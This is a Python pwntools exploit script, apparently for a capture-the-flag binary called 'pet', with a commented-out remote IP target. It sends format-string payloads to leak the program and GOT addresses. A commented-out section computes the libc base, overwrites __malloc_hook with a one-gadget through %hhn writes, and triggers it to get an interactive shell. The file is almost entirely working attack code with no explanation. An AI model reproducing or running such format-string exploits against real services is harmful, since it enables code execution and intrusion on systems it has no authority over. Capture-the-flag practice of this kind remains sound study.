from pwn import *

r = process("./pet")
#gdb.attach(r)

#r = remote("34.125.0.41", 9999)

r.recvuntil(b'Choose one:')


payload = b'fish\x00'
payload += b'\x00'*(20 - len(payload))
payload += b"123%hhn" + b'%9$p'  #97
r.sendline(payload)

stuff = r.recvuntil(b'Choose one:').split(b'0x')[1][:12].decode("utf-8")
elf_base = int("0x" + stuff, 16) - 0x13db
print("elf_base: " + hex(elf_base))

puts_got = elf_base + 0x0000000000003fa0


payload = b'fish\x00\x00\x00\x00' + p64(puts_got)
payload += b'\x00'*(20 - len(payload))
payload += b"%45$s123"  #97
r.sendline(payload)

'''
stuff = r.recvuntil(b'\x7f')[-6:]
libc_base = int.from_bytes(stuff, "little") - 0x0000000000875a0
print("libc_base: " + hex(libc_base))

# 0xce93e 0xce941 0xce944
onegadget = libc_base + 0xe6c7e
malloc_hook = libc_base + 0x00000000001ebb70

print("onegadget: " + hex(onegadget))

byte_1sh = onegadget%0x100
byte_2nd = (onegadget//0x100)%0x100
byte_3rd = (onegadget//0x10000)%0x100


payload = b'fish\x00'
payload += b'\x00'*(20 - len(payload))
payload += b"1234"
#payload += p64(malloc_hook) + p64(malloc_hook+1) + p64(malloc_hook+2)   # 47 48 49
payload += f"{(0x100 - 4 + byte_1sh)%256}x".encode("utf-8") + b'%52$hhn'
payload += f"{(0x100 - byte_1sh + byte_2nd)%256}x".encode("utf-8") + b'%53$hhn'
payload += f"{(0x100 - byte_2nd + byte_3rd)%256}x".encode("utf-8") + b'%54$hhn'
payload += b'1'*(56+8-len(payload))
print(len(payload))
payload += p64(malloc_hook) + p64(malloc_hook+1) + p64(malloc_hook+2)   
r.sendline(payload)


r.recvuntil(b'Choose one:')


payload = b'fish\x00'
payload += b'\x00'*(20 - len(payload))
payload += b"%10000c"
r.sendline(payload)
'''

r.interactive()